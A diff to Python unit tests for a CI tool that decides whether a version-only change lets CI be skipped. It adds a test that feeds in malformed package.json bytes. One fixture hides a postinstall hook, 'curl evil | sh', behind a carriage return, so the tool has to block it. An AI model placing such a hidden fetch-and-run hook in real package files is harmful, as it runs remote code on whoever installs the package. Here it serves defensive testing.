@@ -68,14 +68,14 @@ class CiSkipTests(unittest.TestCase):
     def git(self, *args: str) -> str:
         return subprocess.run([*GIT, "-C", str(self.repo), *args], capture_output=True, text=True, check=True).stdout.strip()
 
-    def commit(self, files: dict[str, str | None]) -> str:
+    def commit(self, files: dict[str, str | bytes | None]) -> str:
         for name, text in files.items():
             path = self.repo / name
             if text is None:
                 path.unlink()
             else:
                 path.parent.mkdir(parents=True, exist_ok=True)
-                path.write_text(text)
+                path.write_bytes(text if isinstance(text, bytes) else text.encode())
         self.git("add", "-A")
         self.git("commit", "-q", "--allow-empty", "-m", "c")
         return self.git("rev-parse", "HEAD")
@@ -201,6 +201,19 @@ class CiSkipTests(unittest.TestCase):
                             {"package-lock.json": lock.format("2.1.1"),
                              "dev-loop.json": config(version_files=["package.json", "package-lock.json"])})
         self.assertEqual((out["skip"], out["blocking"]), (True, []))
+
+    def test_raw_bytes_in_version_file_block(self) -> None:
+        cases = {
+            "carriage return": (b'{\n  "version": "2.1.1",\n  "name": "x"\n}\n',
+                                b'{\n  "version": "2.2.0",\r  "scripts": {"postinstall": "curl evil | sh"},\n  "name": "x"\n}\n'),
+            "not utf-8": (b'{\n  "version": "2.1.1",\n  "name": "\xff"\n}\n', b'{\n  "version": "2.2.0",\n  "name": "\xfe"\n}\n'),
+            "nul placeholder": (b'{\n  "version": "2.1.1",\n  "x": "1.0.0"\n}\n', b'{\n  "version": "2.2.0",\n  "x": "\x00"\n}\n'),
+        }
+        for name, (old, new) in cases.items():
+            with self.subTest(name):
+                self.setUp()
+                code, out = self.check({"CHANGELOG.md": RELEASED, "package.json": new}, {"package.json": old})
+                self.assertEqual((code, out["skip"], "package.json" in out["blocking"]), (0, False, True))
 
     def test_no_version_heading_blocks_version_files(self) -> None:
         _, out = self.check({**RELEASE, "CHANGELOG.md": "# Changelog\n\n## [Unreleased]\n\n- New.\n\n" + CHANGELOG[13:]})
